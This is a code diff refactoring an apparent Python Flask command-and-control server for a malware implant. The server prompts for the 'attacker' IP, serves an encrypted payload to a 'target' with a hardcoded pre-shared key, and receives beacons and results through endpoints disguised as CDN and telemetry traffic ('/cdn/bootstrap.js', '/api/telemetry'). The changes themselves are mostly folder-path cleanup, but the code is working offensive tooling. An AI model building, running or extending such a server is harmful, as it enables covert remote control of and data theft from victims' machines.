@@ -15,12 +15,13 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives import serialization
 
 app = Flask(__name__)
-HOST = ""  # put your local ip here
+HOST = "" or input("enter your attacker/host/local ip:")
 PORT = 8443
-PAYLOAD_PATH = "dist/dist/implant"
+CERT_FOLDER = "cert"
+UPLOAD_FOLDER = "uploads"
+PAYLOAD_FOLDER = "dist"
 tasks = []
 results = []
-UPLOAD_FOLDER = "uploads"
 STAGER_ENDPOINT = "/cdn/bootstrap.js"
 BEACON_ENDPOINT = "/api/telemetry"
 RESULTS_ENDPOINT = "/api/updates"
@@ -85,8 +86,8 @@ def exchange_keys(client_public_bytes: bytes) -> bytes:
     ).derive(shared_secret)
 
     # save key to disk for backup
-    print("[*] Saving to 'cert/derived.key'...")
-    with open("cert/derived.key", "wb") as f:
+    print(f"[*] Saving to '{CERT_FOLDER}/derived.key'...")
+    with open(os.path.join(CERT_FOLDER, "derived.key"), "wb") as f:
         f.write(shared_key)
 
     return shared_key, server_public_bytes
@@ -103,11 +104,11 @@ def restore_key() -> bytes:
     # create "derived.key" if it doesn't exist
     if not os.path.exists("cert/derived.key"):
         print("[!] 'cert/derived.key' not found, creating empty file...")
-        with open("cert/derived.key", "wb") as f:
-            return
+        with open(os.path.join(CERT_FOLDER, "derived.key"), "wb") as f:
+            return None
 
     print("[*] Restoring derived key from last session...")
-    with open("cert/derived.key", "rb") as f:
+    with open(os.path.join(CERT_FOLDER, "derived.key"), "rb") as f:
         shared_key = f.read()
     return shared_key
 
@@ -119,8 +120,10 @@ def send_encrypted_payload():
     Use pycryptodome here since target has it installed
     """
     # encrypt payload before sending if it doesnt exist
-    if not os.path.exists("dist/encrypted_payload"):
-        with open(PAYLOAD_PATH, "rb") as f:
+    encrypted_payload_path = os.path.join(PAYLOAD_FOLDER, "encrypted_payload")
+    if not os.path.exists(encrypted_payload_path):
+        encrypted_payload = None
+        with open(os.path.join(PAYLOAD_FOLDER, "payload"), "rb") as f:
             plain = f.read()
 
             pre_shared_key = b"Kg.\xe1\xfb\x8e\xf6\x81\xa2\xf0g\xd6\xfd\x00\x047\xd0m\xe3\xe7E@\x00\xb4=\xc7\xb4\xc4-\x87\x0c\x17"
@@ -129,10 +132,14 @@ def send_encrypted_payload():
             ciphertext, tag = cipher.encrypt_and_digest(plain)
 
             encrypted_payload = nonce + ciphertext + tag
-            return encrypted_payload
+
+        with open(encrypted_payload_path, "wb") as f:
+            f.write(encrypted_payload)
+
+        return encrypted_payload
 
     # else send existing encrypted payload
-    with open("dist/encrypted_payload", "rb") as f:
+    with open(encrypted_payload_path, "rb") as f:
         payload = f.read()
         return payload
 
@@ -255,6 +262,9 @@ def show_homepage():
 
 
 if __name__ == "__main__":
-    context = ("cert/server.crt", "cert/server.key")
+    context = (
+        os.path.join(CERT_FOLDER, "server.crt"),
+        os.path.join(CERT_FOLDER, "server.key"),
+    )
     derived_key = restore_key()
     app.run(host=HOST, port=PORT, ssl_context=context)
